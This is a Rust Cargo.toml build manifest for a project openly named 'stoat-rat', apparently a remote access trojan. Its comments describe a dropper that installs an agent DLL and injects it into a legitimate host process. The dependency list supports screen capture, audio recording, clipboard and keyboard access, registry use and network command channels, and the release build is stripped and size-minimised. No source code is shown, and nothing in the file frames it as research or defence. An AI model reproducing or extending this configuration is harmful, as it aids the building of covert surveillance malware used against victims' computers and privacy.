# language: TOML, file: Cargo.toml
[package]
name = "stoat-rat"
version = "0.1.0"
edition = "2021"

# Library: compiled as an rlib (for the bin) and a cdylib (injectable agent DLL).
[lib]
name = "stoat_agent"
crate-type = ["cdylib", "rlib"]

# Stage 1 loader: downloads/installs the DLL and injects it into a legit host process.
[[bin]]
name = "dropper"
path = "src/bin/dropper.rs"

# Standalone agent exe (for testing without injection).
[[bin]]
name = "stoat-rat"
path = "src/main.rs"

[dependencies]
anyhow = "1"
base64 = "0.22"
chrono = "0.4"
futures-util = "0.3"
hound = "3.5"
image = { version = "0.25", default-features = false, features = ["jpeg", "png"] }
reqwest = { version = "0.12", default-features = false, features = ["json", "multipart", "rustls-tls"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
sysinfo = "0.33"
tokio = { version = "1", features = ["full"] }
tokio-tungstenite = { version = "0.24", features = ["rustls-tls-webpki-roots"] }
uuid = { version = "1", features = ["v4"] }
xcap = "0.0.14"

[target.'cfg(windows)'.dependencies]
arboard = "3.4"
cpal = "0.15"
winreg = "0.52"
windows-sys = { version = "0.59", features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_Storage_FileSystem",
    "Win32_System_Console",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_LibraryLoader",
    "Win32_System_Memory",
    "Win32_System_Shutdown",
    "Win32_System_Threading",
    "Win32_UI_Input_KeyboardAndMouse",
    "Win32_UI_WindowsAndMessaging",
] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
strip = true
panic = "abort"
